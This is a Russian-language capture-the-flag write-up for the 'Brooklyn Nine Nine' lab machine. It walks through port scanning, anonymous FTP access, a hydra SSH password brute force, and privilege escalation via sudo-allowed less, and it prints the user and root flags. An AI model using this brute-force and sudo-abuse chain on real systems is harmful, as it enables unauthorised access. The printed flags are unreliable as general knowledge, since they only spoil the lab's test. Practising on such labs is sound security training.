# Writeup: Brooklyn Nine Nine

> This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.  

Проверим открытые порты через nmap:
```sh
nmap -sS -sV -p- 10.113.165.97
```
```sh
Starting Nmap 7.991SVN ( https://nmap.org )
Nmap scan report for 10.113.165.97
Host is up (0.0045s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.83 seconds
```

Доступны три открытых порта:
- 21 - ftp
- 22 - ssh
- 80 - webapp  

Проверим FTP на доступ к ftp-серверу под юзером anonymous
```sh
ftp 10.113.165.97
```
Нам удалось поключиться к ftp-серверу и скачать note_to_jake.txt:
```sh
ftp 10.113.165.97
Connected to 10.113.165.97.
220 (vsFTPd 3.0.3)
Name (10.113.165.97:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||50836|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> id
550 Permission denied.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||50764|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |***************************************|   119       62.95 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (19.99 KiB/s)
ftp> !cat note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

```
У нас есть заметка, которая говорит нам о двух вещах:
- есть пользователь amy
- есть пользователь jake  

Попробуем узнать скрытые директории
```sh
python3 -m cyberwarn fuzz-dirs --url=http://10.113.165.97 --wordlist=data/wordlist/web/top-10k-web-directories_from_10M_urlteam_links.txt --workers=100
```
Ничего интересного не смог обнаружить, идем дальше. На самой странице есть комментарий в html:
```sh
<!-- Have you ever heard of steganography? -->
```
Стоит попробовать исследовать изображение с помощью exiftool, возможно, есть какие-то комментарии в изображении:
```sh
curl http://10.113.165.97/brooklyn99.jpg -O brooklyn99.jpg
exiftool brooklyn99.jpg
```
```sh
ExifTool Version Number         : 13.57
File Name                       : brooklyn99.jpg
Directory                       : .
File Size                       : 70 kB
File Modification Date/Time     : 2026:11:16 23:00:34+04:00
File Access Date/Time           : 2026:11:16 23:00:33+04:00
File Inode Change Date/Time     : 2026:11:16 23:00:34+04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 533
Image Height                    : 300
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 533x300
Megapixels                      : 0.160
```
У меня нет богатого опыта в стеганографии и я тут не вижу пока что ничего необычного :)  
Если просмотреть текстовые значения в изображении через утилиту strings, то можно заметить вот такие строки:
```sh
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
```
После двоеточия идет алфавит, который начинается не с самого начала, а с букв *C*.  
Так как в записке note_to_jake нам говорилось, что у jake слабый пароль. Но от чего он? возможно, что речь про ssh.  
С помощью hydra быстро выяснили пароль:
```sh
hydra -l jake -P /tmp/pass.txt ssh://10.113.165.97
```
```sh
Hydra v9.8dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-16 19:19:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.113.165.97:22/
[22][ssh] host: 10.113.165.97   misc: (null)   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-16 19:20:19
```

Далее мы выяснили, что от рута можем запускать утилиту less, звучит круто!
```sh
jake@brookly_nine_nine:~$ sudo -l
```
```sh
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```
За время проверки директории были обнаружены находки:  
photo.jpg
```sh
jake@brookly_nine_nine:~$ ls /var/www/html/
brooklyn99.jpg  index.html  photo.jpg
```
Историю bash команд от jake, которая раскрывает подключение к holt@10.10.10.30:
```sh
ssh -i id_rsa holt@10.10.10.30
```
В целом, пока что не будем акцентировать на это внимание и попробуем прочитать пользвательский флаг, который должен быть в /home/holt
```sh
jake@brookly_nine_nine:/var/www/html$ ls /home/holt/
nano.save  user.txt
```
```sh
jake@brookly_nine_nine:/var/www/html$ less /home/holt/user.txt > /tmp/user.txt
jake@brookly_nine_nine:/var/www/html$ cat /tmp/user.txt
```
```sh
ee11cbb19052e40b07aac0ca060c23ee
```
И собственно, попробуем сам root.txt
```sh
jake@brookly_nine_nine:/var/www/html$ ls /root
```
```sh
ls: cannot open directory '/root': Permission denied
```
```sh
jake@brookly_nine_nine:/var/www/html$ less /root/root.txt
WARNING: terminal is not fully functional
-- Creator : Fsociety2006 --N)
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```
Не так получилось выполнить задачу, как хотелось, но все же

### Инструменты, используемые для решения задачи:
- ftp
- ssh
- hydra
- exiftool
